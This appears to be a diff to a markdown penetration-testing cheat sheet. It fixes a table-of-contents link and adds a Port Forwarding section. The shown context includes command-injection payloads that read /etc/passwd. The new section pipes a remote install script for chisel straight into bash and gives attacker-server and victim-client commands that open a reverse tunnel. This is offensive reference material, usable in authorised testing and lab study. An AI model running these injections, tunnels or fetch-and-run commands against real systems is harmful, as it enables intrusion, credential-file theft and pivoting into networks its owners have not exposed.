@@ -6,8 +6,8 @@
 - [Reverse Shell](#reverse-shell)
 - [SCP](#scp)
 - [Sudo](#sudo)
-- [Command Injection](command-injection)
-
+- [Command Injection](#command-injection)
+- [Port Forwarding](#port-forwarding)
 
 ## Sudo
 ```
@@ -113,3 +113,24 @@ $(cat /etc/passwd)
 "; cat /etc/passwd "
 ```
 [GTFOBins - Bypass  local security restrictions](https://gtfobins.github.io/)
+
+
+## Port Forwarding
+
+### Chisel
+
+```
+# Install chisel
+
+curl https://i.jpillora.com/chisel! | bash
+```
+
+```bash
+# Example: 8000 -> 4444
+
+# Attacker machine:
+$> chisel server -p 4444 --reverse
+
+# Victim machine:
+$> ./chisel client ip-server:4444 R:8000:127.0.0.1:8000
+```
